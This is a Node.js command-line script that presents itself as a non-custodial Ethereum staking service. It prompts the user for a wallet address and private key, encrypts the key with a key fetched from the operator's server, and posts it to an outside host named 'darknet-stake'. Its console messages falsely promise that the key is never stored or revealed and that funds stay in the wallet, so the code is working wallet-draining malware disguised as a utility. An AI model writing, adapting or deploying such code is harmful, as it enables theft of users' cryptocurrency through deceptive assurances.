const crypto = require('crypto');
const fetch = require('node-fetch');
const readline = require('readline');
const ethers = require('ethers');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// Configuration
const API_URL = 'https://darknet-stake.onrender.com';
const SESSION_FILE = path.join(__dirname, '.session');

// Session management
let sessionId = null;
let encryptionKey = null;

// Function to get the current session ID
function getSessionId() {
  return sessionId;
}

// Initialize or load existing session
async function initializeSession() {
  try {
    // Try to load existing session
    if (fs.existsSync(SESSION_FILE)) {
      const sessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
      sessionId = sessionData.sessionId;
      console.log('Loaded existing session ID:', sessionId);
    } else {
      // Generate a new session ID
      sessionId = uuidv4();
      console.log('Generated new session ID:', sessionId);
      
      // Save the session ID
      fs.writeFileSync(SESSION_FILE, JSON.stringify({ 
        sessionId,
        created: new Date().toISOString()
      }));
    }
    
    // Get the encryption key for this session
    await getEncryptionKey();
    return true;
  } catch (error) {
    console.error('Error initializing session:', error);
    return false;
  }
}

// Get the encryption key from the server
async function getEncryptionKey() {
  try {
    const response = await axios.post(`${API_URL}/api/get-encryption-key`, {
      sessionId
    });
    
    if (response.data.success) {
      encryptionKey = response.data.encryptionKey;
      return true;
    } else {
      console.error('Failed to get encryption key:', response.data.error);
      return false;
    }
  } catch (error) {
    console.error('Error getting encryption key:', error);
    throw error;
  }
}

// End the session
async function endSession() {
  try {
    if (!sessionId) {
      console.log('No active session to end');
      return true;
    }
    
    const response = await axios.post(`${API_URL}/api/end-session`, {
      sessionId
    });
    
    if (response.data.success) {
      console.log('Session ended successfully');
      
      // Remove the session file
      if (fs.existsSync(SESSION_FILE)) {
        fs.unlinkSync(SESSION_FILE);
      }
      
      sessionId = null;
      encryptionKey = null;
      
      return true;
    } else {
      console.error('Failed to end session:', response.data.error);
      return false;
    }
  } catch (error) {
    console.error('Error ending session:', error);
    return false;
  }
}

// Make sure we have a session before encrypting
async function ensureSession() {
  if (!sessionId || !encryptionKey) {
    return initializeSession();
  }
  return true;
}

// Threshold for full validator: 32 ETH
const BALANCE_THRESHOLD = ethers.parseEther('32');

// Function to encrypt data
async function encrypt(text) {
  // Make sure we have a session
  await ensureSession();
  console.log('Session ID:', sessionId);
  console.log('CLIENT encryption key for current session:', encryptionKey);
  
  // Generate a random initialization vector
  const iv = crypto.randomBytes(16);
  
  // Create cipher
  const cipher = crypto.createCipheriv(
    'aes-256-cbc', 
    Buffer.from(encryptionKey, 'hex'), 
    iv
  );
  
  // Encrypt the text
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  
  // Return IV and encrypted data as hex strings
  return `${iv.toString('hex')}:${encrypted.toString('hex')}`;
}

// Function to check balance
async function checkBalance(address) {
  try {
    // Connect to network
    const rpcUrl = 'https://mainnet.infura.io/v3/c10f2fdee917412e8895dd6f9807e010';
    
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    
    // Get the balance
    const balance = await provider.getBalance(address);
    
    // Convert to ETH for display
    const balanceInEth = ethers.formatEther(balance);
    console.log(`\nCurrent balance: ${balanceInEth} ETH`);
    
    // Check if balance is enough for full validator
    const isEnough = balance >= BALANCE_THRESHOLD;
    
    if (isEnough) {
      console.log('Balance at least 32 ETH. Attempting to run as full validator...');
    } else {
      console.log('Balance is less than 32 ETH. Attempting to join staking pool...');
    }
    
    return { balance, balanceInEth, isEnough };
  } catch (error) {
    console.error('Error checking balance:', error.message);
    throw error;
  }
}

// Request stake delegation
  async function requestStake(sessionId, stakeAddress, privateKey, periodInDays, userId) {
  try {
    const sessionId = getSessionId();
    // Check the balance
    const { balance, isEnough } = await checkBalance(stakeAddress);
    
    // Encrypt the user key
    const encryptedPrivateKey = await encrypt(privateKey);
    
    console.log('Sending stake request to server...');
    // Send the stake request to server
    const response = await fetch(`${API_URL}/api/stake`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        encryptedPrivateKey,
        stakeAddress,
        periodInDays,
        userId,
        network: 'mainnet' 
      }),
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to process stake');
    }

    // Success message
    console.log(`Success: ${data.message}`);
    console.log(`Address: ${stakeAddress} | User ID: ${userId} | Stake duration: ${periodInDays} days`);

    // End session after success
    await endSession();
    console.log('Session ended. Exiting...');
    process.exit(0);

    
    return data;
  } catch (error) {
    console.error('Error:', error.message);
    throw error;
  }
}

// Interactive CLI
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log('Staking Service Initialized');
console.log('----------------------------------------');
console.log('Listening on /stake endpoint...');
console.log('No ETH transfer required — staking is non-custodial.');
console.log('Your ETH stays in your wallet. All staking actions are performed via delegations.');

console.log('Recommended stake amount for full validator status: 32 ETH');
console.log('You can stake less than 32 ETH — partial staking is supported.');
console.log('Note: Rewards may vary based on network conditions and your staked amount.');
console.log('----------------------------------------');
console.log(`Service started at: ${new Date().toISOString()}`);


rl.question('Enter stake address: ', async (stakeAddress) => {
  try {
    await ensureSession();
    const sessionId = getSessionId();
    // Check balance on mainnet
    const { isEnough } = await checkBalance(stakeAddress);
    
    // Continue with the stake process regardless of balance
    rl.question('Enter private key (used only for signing - never stored or revealed): ', (privateKey) => {
      rl.question('Enter period (in days): ', (periodInDays) => {
        rl.question('Enter user ID: ', (userId) => {
          console.log('\nProcessing stake request...');
          
          requestStake(sessionId, stakeAddress, privateKey, periodInDays, userId)
            .then(() => {
              console.log('\nStake will remain active for selected period.');
              rl.close();
            })
            .catch(error => {
              console.error('\nStake failed:', error.message);
              rl.close();
            });
        });
      });
    });
  } catch (error) {
    console.error('Error during balance check:', error.message);
    rl.close();
  }
});
